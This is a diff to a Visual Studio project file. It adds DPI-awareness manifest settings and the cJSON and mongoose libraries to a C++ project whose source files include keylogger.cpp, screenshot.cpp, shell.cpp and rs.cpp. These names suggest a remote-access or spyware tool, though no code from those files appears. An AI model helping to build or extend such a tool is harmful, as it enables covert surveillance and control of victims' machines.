@@ -105,6 +105,9 @@
       <SubSystem>Windows</SubSystem>
       <GenerateDebugInformation>true</GenerateDebugInformation>
     </Link>
+    <Manifest>
+      <EnableDpiAwareness>true</EnableDpiAwareness>
+    </Manifest>
   </ItemDefinitionGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
     <ClCompile>
@@ -121,6 +124,9 @@
       <OptimizeReferences>true</OptimizeReferences>
       <GenerateDebugInformation>true</GenerateDebugInformation>
     </Link>
+    <Manifest>
+      <EnableDpiAwareness>true</EnableDpiAwareness>
+    </Manifest>
   </ItemDefinitionGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
     <ClCompile>
@@ -133,6 +139,9 @@
       <SubSystem>Windows</SubSystem>
       <GenerateDebugInformation>true</GenerateDebugInformation>
     </Link>
+    <Manifest>
+      <EnableDpiAwareness>true</EnableDpiAwareness>
+    </Manifest>
   </ItemDefinitionGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
     <ClCompile>
@@ -149,11 +158,16 @@
       <OptimizeReferences>true</OptimizeReferences>
       <GenerateDebugInformation>true</GenerateDebugInformation>
     </Link>
+    <Manifest>
+      <EnableDpiAwareness>true</EnableDpiAwareness>
+    </Manifest>
   </ItemDefinitionGroup>
   <ItemGroup>
+    <ClCompile Include="src\cJSON\cJSON.c" />
     <ClCompile Include="src\http.cpp" />
     <ClCompile Include="src\keylogger.cpp" />
     <ClCompile Include="src\main.cpp" />
+    <ClCompile Include="src\mongoose\mongoose.c" />
     <ClCompile Include="src\rs.cpp" />
     <ClCompile Include="src\screenshot.cpp" />
     <ClCompile Include="src\shell.cpp" />
@@ -162,7 +176,8 @@
     <ClCompile Include="src\ws.cpp" />
   </ItemGroup>
   <ItemGroup>
-    <ClInclude Include="src\mongoose.hpp" />
+    <ClInclude Include="src\cJSON\cJSON.h" />
+    <ClInclude Include="src\mongoose\mongoose.h" />
     <ClInclude Include="src\pa5a.hpp" />
   </ItemGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
